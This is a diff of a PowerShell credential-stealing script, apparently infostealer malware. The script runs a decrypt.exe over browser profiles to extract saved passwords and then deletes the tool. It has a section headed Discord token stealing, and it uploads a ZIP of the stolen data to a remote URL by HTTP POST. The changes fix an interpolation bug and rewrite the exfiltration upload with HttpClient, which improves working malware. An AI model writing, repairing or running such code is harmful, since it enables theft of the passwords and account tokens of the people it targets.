@@ -68,14 +68,14 @@ foreach ($profile in $profiles) {
         if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
             # Run the decrypt.exe with specified parameters and capture output
             $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-            Write-Host "Decrypt.exe output for $profileName: $($result)"  # Hata düzeltildi
-    
+            Write-Host "Decrypt.exe output for ${profileName}: $($result)"  # Hata düzeltildi
+
             if (Test-Path $outputPath) {
                 Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
             } else {
                 Write-Host "$profileName - Decrypted passwords not found."
             }
-    
+
             # Delete decrypt.exe after use
             try {
                 Remove-Item $decryptExePath -Force -ErrorAction Stop
@@ -89,7 +89,6 @@ foreach ($profile in $profiles) {
     } else {
         Write-Host "$profileName - decrypt.exe not found."
     }
-
 }
 
 # Discord token stealing
@@ -197,34 +196,24 @@ if (Test-Path $zipFilePath) {
         $fileUploadData = @"
 --$boundary
 Content-Disposition: form-data; name="file"; filename="$fileName"
-Content-Type: application/octet-stream
+Content-Type: application/zip
 
 $encodedFile
 --$boundary--
 "@
 
-        $webRequest = [System.Net.WebRequest]::Create($url)
-        $webRequest.Method = "POST"
-        $webRequest.ContentType = $contentType
-        $webRequest.Headers.Add("User-Agent", "Mozilla/5.0")
-        $webRequest.ContentLength = $fileUploadData.Length
+        $httpClient = New-Object System.Net.Http.HttpClient
+        $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
+        $response = $httpClient.PostAsync($url, [System.Net.Http.StringContent]::new($fileUploadData, [System.Text.Encoding]::UTF8, $contentType)).Result
 
-        $requestStream = $webRequest.GetRequestStream()
-        $requestStream.Write([System.Text.Encoding]::UTF8.GetBytes($fileUploadData), 0, $fileUploadData.Length)
-        $requestStream.Close()
-
-        $response = $webRequest.GetResponse()
-        $responseStream = $response.GetResponseStream()
-        $reader = New-Object System.IO.StreamReader($responseStream)
-        $responseContent = $reader.ReadToEnd()
-        $reader.Close()
-
-        Write-Host "File uploaded successfully!"
+        if ($response.IsSuccessStatusCode) {
+            Write-Host "File uploaded successfully."
+        } else {
+            Write-Host "File upload failed. Status code: $($response.StatusCode)"
+        }
     } catch {
-        Write-Host "File upload failed: $_"
+        Write-Host "Error uploading file: $_"
     }
 } else {
-    Write-Host "ZIP file not found, cannot upload."
+    Write-Host "ZIP file not found for upload."
 }
-
-Write-Host "Script execution completed."
